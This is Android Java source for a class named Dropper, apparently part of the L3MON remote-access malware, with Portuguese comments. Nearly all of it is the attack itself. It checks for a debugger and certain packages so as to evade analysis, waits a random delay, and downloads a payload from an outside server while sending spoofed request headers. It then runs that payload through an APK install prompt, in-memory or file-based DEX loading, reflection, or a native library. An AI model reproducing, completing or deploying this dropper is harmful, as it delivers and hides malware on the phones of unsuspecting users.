package com.etechd.l3mon;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Debug;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.util.Random;

import android.support.v4.content.FileProvider;

public class Dropper extends Activity {
    private static final String TAG = "L3MON_Dropper";
    private static final String PAYLOAD_URL = "https://l3mon-server.com/download/payload.apk";
    private static final String PAYLOAD_HASH = "sha256:expected_hash_here";
    private static final int DELAY_MS = 5000 + new Random().nextInt(5000);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dropper);

        // Anti-análise
        if (!checkEnvironment()) {
            finish();
            return;
        }

        // Delay aleatório
        new Handler(Looper.getMainLooper()).postDelayed(this::downloadAndExecutePayload, DELAY_MS);
    }

    private boolean checkEnvironment() {
        // Verificação de debugging
        if (Debug.isDebuggerConnected()) {
            Log.e(TAG, "Debugging detected");
            return false;
        }

        // Verificação de sandbox
        String[] suspiciousPackages = {"com.android.shell", "com.samsung.android.app.sbrowser"};
        for (String pkg : suspiciousPackages) {
            try {
                getPackageManager().getPackageInfo(pkg, 0);
                Log.e(TAG, "Suspicious package detected");
                return false;
            } catch (Exception ignored) {}
        }

        return true;
    }

    private void downloadAndExecutePayload() {
        try {
            byte[] payloadData = downloadPayload();
            if (payloadData == null) return;

            if (!verifyPayload(payloadData)) return;

            // Verificar se é APK
            if (isApkFile(payloadData)) {
                installApk(payloadData);
            } else {
                // Usar carregamento normal
                if (!tryInMemoryLoad(payloadData) &&
                        !tryDexClassLoaderLoad(payloadData) &&
                        !tryReflectionLoad(payloadData) &&
                        !tryNativeLoad(payloadData)) {
                    Log.e(TAG, "Todos os métodos falharam");
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Erro no carregamento", e);
        }
    }

    private byte[] downloadPayload() {
        try {
            URL url = new URL(PAYLOAD_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            // Headers falsos
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setRequestProperty("Accept", "*/*");
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");

            conn.connect();

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                InputStream is = conn.getInputStream();
                ByteArrayOutputStream os = new ByteArrayOutputStream();

                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }

                return os.toByteArray();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao baixar payload", e);
        }
        return null;
    }

    private boolean verifyPayload(byte[] data) {
        try {
            // Check integrity
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(data);
            String calculatedHash = bytesToHex(hash);

            if (!calculatedHash.equals(PAYLOAD_HASH)) {
                Log.e(TAG, "Payload verification failed");
                return false;
            }

            // Check size
            if (data.length > 1024 * 1024) { // 1MB max
                Log.e(TAG, "Payload too large");
                return false;
            }

            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error verifying payload", e);
            return false;
        }
    }

    private boolean isApkFile(byte[] data) {
        try {
            if (data.length < 4) return false;

            // Verificar header APK
            return (data[0] == 0x50 && data[1] == 0x4B && data[2] == 0x03 && data[3] == 0x04);
        } catch (Exception e) {
            return false;
        }
    }

    private void installApk(byte[] apkData) {
        try {
            // Salvar APK temporário
            File tmpDir = getFilesDir();
            File apkFile = new File(tmpDir, "payload.apk");

            FileOutputStream fos = new FileOutputStream(apkFile);
            fos.write(apkData);
            fos.close();

            // Instalar APK
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri apkUri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                apkUri = FileProvider.getUriForFile(this, getPackageName() + ".provider", apkFile);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            } else {
                apkUri = Uri.fromFile(apkFile);
            }
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

            // Limpar
            if (!apkFile.delete()) {
                Log.w(TAG, "Failed to delete temporary APK file");
            }

        } catch (Exception e) {
            Log.e(TAG, "Erro ao instalar APK", e);
        }
    }

    // Métodos de carregamento normais
    private boolean tryInMemoryLoad(byte[] data) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                ByteBuffer buffer = ByteBuffer.wrap(data);
                InMemoryDexClassLoader loader = new InMemoryDexClassLoader(buffer, getClassLoader());
                Class<?> payloadClass = loader.loadClass("com.payload.Payload");
                Object instance = payloadClass.getDeclaredConstructor().newInstance();
                payloadClass.getMethod("execute").invoke(instance);
                return true;
            } catch (Exception e) {
                Log.e(TAG, "InMemory load failed", e);
                return false;
            }
        }
        return false;
    }

    private boolean tryDexClassLoaderLoad(byte[] data) {
        try {
            File dir = getFilesDir();
            File payloadFile = new File(dir, "payload.dex");

            FileOutputStream fos = new FileOutputStream(payloadFile);
            fos.write(data);
            fos.close();

            if (!payloadFile.setReadOnly()) {
                Log.w(TAG, "Failed to set payload file to read-only");
            }

            DexClassLoader loader = new DexClassLoader(
                    payloadFile.getAbsolutePath(),
                    getCacheDir().getAbsolutePath(),
                    null,
                    getClassLoader()
            );

            Class<?> payloadClass = loader.loadClass("com.payload.Payload");
            Object instance = payloadClass.getDeclaredConstructor().newInstance();
            payloadClass.getMethod("execute").invoke(instance);

            if (!payloadFile.delete()) {
                Log.w(TAG, "Failed to delete temporary payload file");
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "DexClassLoader load failed", e);
            return false;
        }
    }

    private boolean tryReflectionLoad(byte[] data) {
        try {
            // Load via reflection
            Class<?> existingClass = Class.forName("com.etechd.l3mon.StringCrypto");
            existingClass.getDeclaredConstructor().newInstance();

            // Load payload
            DexClassLoader loader = new DexClassLoader(
                    new File(getFilesDir(), "payload.dex").getAbsolutePath(),
                    getCacheDir().getAbsolutePath(),
                    null,
                    getClassLoader()
            );
            Class<?> payloadClass = loader.loadClass("com.payload.Payload");
            Object instance = payloadClass.getDeclaredConstructor().newInstance();

            // Execute
            payloadClass.getMethod("execute").invoke(instance);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Reflection load failed", e);
            return false;
        }
    }

    private boolean tryNativeLoad(byte[] data) {
        try {
            // Load native library
            System.loadLibrary("native_loader");

            // Call native function
            nativeLoadPayload(data);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Native load failed", e);
            return false;
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    // Native method declaration
    private native void nativeLoadPayload(byte[] data);

    static {
        System.loadLibrary("dropper");
    }
}